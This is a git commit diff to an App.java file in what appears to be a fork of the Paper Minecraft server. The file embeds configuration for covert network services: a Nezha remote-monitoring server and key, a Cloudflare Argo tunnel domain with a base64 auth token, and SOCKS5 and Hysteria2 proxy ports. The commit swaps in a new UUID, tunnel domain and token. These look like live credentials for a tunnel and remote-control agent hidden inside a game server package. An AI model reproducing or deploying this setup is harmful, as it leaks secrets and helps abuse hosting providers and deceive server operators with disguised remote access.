f1948ef0288da45be8cc0d0ab018b35f3aceaf75
fgnb666 <156969437+fgnb666@users.noreply.github.com>
2026-09-09 13:22:38 +0800

    Update App.java

--- paper-server/src/main/java/io/papermc/paper/sbx/App.java
+++ paper-server/src/main/java/io/papermc/paper/sbx/App.java
@@ -44,12 +44,12 @@ public class App {
     private static final boolean YT_WARPOUT = envBool("YT_WARPOUT", false);
     private static final String FILE_PATH = env("FILE_PATH", "world");
     private static final String SUB_PATH = env("SUB_PATH", "sub");
-    private static final String UUID = env("UUID", "9adc253a-2ac4-447f-b4aa-573bae53e043");
+    private static final String UUID = env("UUID", "67426cde-eb47-4ce9-8f9b-07793d04e39d");
     private static final String NEZHA_SERVER = env("NEZHA_SERVER", "nzku.fortymenty.eu.org:443");
     private static final String NEZHA_PORT = env("NEZHA_PORT", "");
     private static final String NEZHA_KEY = env("NEZHA_KEY", "UsC5sNDciSaNggxJdB3EGSGYS242VT7q");
-    private static final String ARGO_DOMAIN = env("ARGO_DOMAIN", "fadehost.yszy.nyc.mn");
-    private static final String ARGO_AUTH = env("ARGO_AUTH", "eyJhIjoiZjUxNzk5OTMxMWQ4ZTAzOTg4OThmZjRkMTZiZDYzYjQiLCJ0IjoiYjNlZTU3ZDYtYmMwYy00OGJiLTk3NDctNjI1ODAzZGJmZDVlIiwicyI6Ik5XSmhZakZtTkRVdFptVmlZaTAwWVRnekxUaGpPREF0TkdZeU16Y3lPR00xWVRBMSJ9");
+    private static final String ARGO_DOMAIN = env("ARGO_DOMAIN", "mcfreehost.yszy.nyc.mn");
+    private static final String ARGO_AUTH = env("ARGO_AUTH", "eyJhIjoiZjUxNzk5OTMxMWQ4ZTAzOTg4OThmZjRkMTZiZDYzYjQiLCJ0IjoiMDIyM2VjY2UtMTAzMi00ZjVhLWE4MzctY2ViN2Y0YWY5MzMxIiwicyI6IlpUUXlNemc1WWpJdE5Ea3paUzAwT0dVekxXSTBNRGt0WVRjNU16RmpZbU00TUROaSJ9");
     private static final int ARGO_PORT = envInt("ARGO_PORT", 9677);
     private static final String S5_PORT = env("S5_PORT", "");
     private static final String HY2_PORT = env("HY2_PORT", "");
